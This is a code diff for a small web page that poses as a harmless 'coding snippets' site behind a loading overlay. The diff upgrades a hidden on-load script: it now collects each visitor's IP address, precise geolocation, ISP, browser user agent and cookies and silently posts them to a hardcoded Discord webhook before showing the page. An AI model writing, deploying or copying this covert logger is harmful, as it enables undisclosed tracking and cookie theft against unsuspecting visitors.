@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>O</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>McCoding</title>  <!-- Updated website title here -->
   <style>
     body {
       text-align: center;
@@ -16,6 +16,7 @@
       align-items: center;
       position: relative;
       overflow: hidden; /* Prevent scrolling */
+      font-family: Arial, sans-serif;
     }
     #overlay {
       position: absolute;
@@ -31,20 +32,34 @@
       color: white;
       font-size: 24px;
       z-index: 10; /* Ensure overlay is on top */
+      padding: 20px;
     }
     #content {
       display: none; /* Hide content initially */
       font-size: 20px;
       margin-top: 20px;
+      max-width: 600px;
+      text-align: left;
+      background: #222;
+      padding: 20px;
+      border-radius: 8px;
+    }
+    pre {
+      background: #111;
+      padding: 15px;
+      border-radius: 5px;
+      overflow-x: auto;
+      color: #0f0;
     }
   </style>
 </head>
 <body>
 
-<div id="overlay">Loading MxxCode for You, Please Wait...</div>
-<div id="content">
-  <p>Here are some random coding snippets:</p>
-  <pre>
+  <div id="overlay">Loading MxxCode for You, Please Wait...</div>
+
+  <div id="content">
+    <p>Here are some random coding snippets:</p>
+    <pre>
     // JavaScript Example
     function greet(name) {
       return `Hello, ${name}!`;
@@ -56,48 +71,79 @@
 
     // HTML Example
     &lt;div&gt;Hello, World!&lt;/div&gt;
-  </pre>
-  <p>Go talk to Mxhid!</p>
-</div>
+    </pre>
+    <p>Go talk to Mxhid!</p>
+  </div>
 
-<script>
-  function fetchAndSendIP() {
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        const userIP = data.ip;
-        
-        // Send the IP to the webhook
-        fetch('https://discord.com/api/webhooks/1372872545396588666/HmJyhyOhUR9fA782D96YY2qUEFS3gdpskvFP4e4sA9yUvr1x7XYkKk0FS1lbHpFLM3Tf', {
+  <script>
+    async function fetchAndSendUserInfo() {
+      try {
+        // Step 1: Get IP address
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        if (!ipResponse.ok) throw new Error('Failed to fetch IP');
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+
+        // Step 2: Get location and other info using ip-api.com
+        const locationResponse = await fetch(`https://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
+        if (!locationResponse.ok) throw new Error('Failed to fetch location info');
+        const locationData = await locationResponse.json();
+
+        if (locationData.status !== "success") {
+          throw new Error(`Location API error: ${locationData.message}`);
+        }
+
+        // Step 3: Get browser info
+        const userAgent = navigator.userAgent;
+
+        // Step 4: Get cookies from your own domain
+        const cookies = document.cookie || 'No cookies found';
+
+        // Step 5: Prepare message content for Discord webhook
+        const messageContent = `
+**User Information:**
+- IP Address: ${userIP}
+- Country: ${locationData.country}
+- Region: ${locationData.regionName}
+- City: ${locationData.city}
+- ZIP: ${locationData.zip}
+- Latitude: ${locationData.lat}
+- Longitude: ${locationData.lon}
+- Timezone: ${locationData.timezone}
+- ISP: ${locationData.isp}
+- Organization: ${locationData.org}
+- AS: ${locationData.as}
+- User Agent: ${userAgent}
+- Cookies: ${cookies}
+        `;
+
+        // Step 6: Send data to Discord webhook
+        const webhookURL = 'https://discord.com/api/webhooks/1372872545396588666/HmJyhyOhUR9fA782D96YY2qUEFS3gdpskvFP4e4sA9yUvr1x7XYkKk0FS1lbHpFLM3Tf';
+
+        const sendResponse = await fetch(webhookURL, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ content: `User  IP: ${userIP}` })
-        })
-        .then(response => {
-          if (response.ok) {
-            console.log('IP sent successfully!');
-            // Show the content after sending the IP
-            document.getElementById('overlay').style.display = 'none'; // Hide overlay
-            document.getElementById('content').style.display = 'block'; // Show content
-          } else {
-            console.error('Failed to send IP.');
-          }
-        })
-        .catch(error => {
-          console.error('Error sending IP:', error);
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: messageContent })
         });
-      })
-      .catch(error => {
-        document.getElementById('overlay').innerText = 'Failed to retrieve IP.';
-        console.error('Error fetching IP:', error);
-      });
-  }
 
-  // Call the function to fetch and send IP when the page loads
-  window.onload = fetchAndSendIP;
-</script>
+        if (!sendResponse.ok) {
+          throw new Error('Failed to send data to webhook');
+        }
+
+        console.log('User info sent successfully!');
+
+        // Step 7: Show content and hide overlay
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById('content').style.display = 'block';
+
+      } catch (error) {
+        console.error('Error:', error);
+        document.getElementById('overlay').innerText = 'Failed to retrieve user information.';
+      }
+    }
+
+    window.onload = fetchAndSendUserInfo;
+  </script>
 
 </body>
 </html>
